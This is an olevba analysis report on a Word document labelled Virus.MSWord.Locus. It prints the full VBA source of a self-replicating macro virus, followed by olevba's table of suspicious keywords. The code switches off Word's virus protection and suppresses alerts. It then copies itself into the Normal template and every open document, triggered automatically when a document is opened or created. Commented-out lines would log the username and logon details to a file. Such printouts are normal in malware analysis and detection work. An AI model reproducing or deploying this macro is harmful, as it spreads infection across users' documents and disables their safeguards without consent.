olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Locus
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Locus - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Бороться и искать
'Найти и ...размножаться!!!
'03.12.05
'Locust_Ver.01
Private Sub Main()
Dim i, k As Byte
On Error Resume Next
'Open "c:\Locust_rep.txt" For Append As #1
'Print #1, Date; "_"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "username")
'Print #1, "/"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "PrimaryProvider")
'Print #1, "/"; System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "LMLogon")
Application.Options.VirusProtection = False
Application.Options.SaveNormalPrompt = False
Application.Options.SavePropertiesPrompt = False
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Application.EnableCancelKey = xlDisabled
   With Application.NormalTemplate.VBProject.VBComponents(1).CodeModule
     If .Find("размножаться", 1, 1, 4, 25, True, False) = False Then
       .InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines)
       .ReplaceLine 3, "'" & Date
       Application.NormalTemplate.Save
       'Print #1, "/"; "Normal"
     End If
   End With
   For i = 1 To Application.Documents.Count
     With Application.Documents(i).VBProject.VBComponents(1).CodeModule
       If .Find("размножаться", 1, 1, 4, 25, True, False) = False Then
         .InsertLines 1, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines)
         .ReplaceLine 3, "'" & Date
         'Documents(i).WritePassword = "1"
         Application.Documents(i).SaveAs (Documents(i).Path + Documents(i).Name)
         'Print #1, "/"; Documents(i).Name
       End If
     End With
   Next i
  'Close #1
  Application.ScreenUpdating = True
  Application.DisplayAlerts = True
  Application.EnableCancelKey = xlInterrupt
End Sub
Private Sub Document_New()
  On Error Resume Next
  Main
End Sub
Private Sub Document_Open()
  On Error Resume Next
  Main
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

